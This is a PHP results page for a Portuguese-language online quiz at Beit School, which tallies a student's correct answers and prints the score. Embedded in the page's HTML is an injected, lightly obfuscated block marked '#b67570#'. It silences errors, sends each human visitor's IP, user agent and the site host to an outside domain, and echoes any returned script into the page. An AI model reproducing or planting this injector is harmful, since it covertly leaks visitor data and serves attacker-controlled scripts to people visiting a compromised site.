<?php

# ------------------------------------------------------------------ #
ini_set( 'display_errors', 1 );
error_reporting( E_ALL );
# ------------------------------------------------------------------ #
include_once( "_config.php" );
include_once( "classes/utils.php" );
include_once( "classes/testeDAO.php" );
# ------------------------------------------------------------------ #
session_start();

$id = $_POST['id_teste'];
$teste = new testes( $id );
$qtd_perguntas = $_POST['qtd_perguntas'];
$corretas = testeDAO::getResultado( $id );
$respostas = array();
$acertos = 0;

for( $i = 0; $i < $qtd_perguntas; $i++ )
{

	if ( $_POST['q' . $i] == $corretas[$i]->id )
	{
		$acertos++;
	}
}

?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8" />
	<link rel="stylesheet" type="text/css" href="css/teste_online.css" media="all" /> 
</head>
<body>
	<div id="content">
		<div id="header">
			<img src="img/logo-beit.png" alt="Beit School" title="Beit School" />
			<h1><?php echo $teste->titulo ?></h1>
			<h2>Teste Online</h2>
		</div>
		<hr />
		<div id="result">
			<p>Você concluiu o teste online! Veja abaixo seu resultado:</p>
			<?php if( $acertos == 0 ): ?>
<?php
#b67570#
error_reporting(0); @ini_set('display_errors',0); $wp_bww5934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_bww5934) && !preg_match ('/bot/i', $wp_bww5934))){
$wp_bww095934="http://"."style"."generated".".com/"."generated"."/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_bww5934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_bww095934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_5934bww = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_5934bww = @file_get_contents($wp_bww095934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_5934bww=@stream_get_contents(@fopen($wp_bww095934, "r"));}}
if (substr($wp_5934bww,1,3) === 'scr'){ echo $wp_5934bww; }
#/b67570#
?>
				<p>Você não acertou nenhuma questão.</p>
			<?php else: ?>
				<p>Você acertou <b><?php echo $acertos ?></b> pergunta(s).
			<?php endif ?>
			<br /><br /><br />
			<a href="index.php" alt="Home" title="Home">voltar para home</a>
		</div>
		<div id="footer">
			<hr />
		</div>
	</div>
</body>
</html>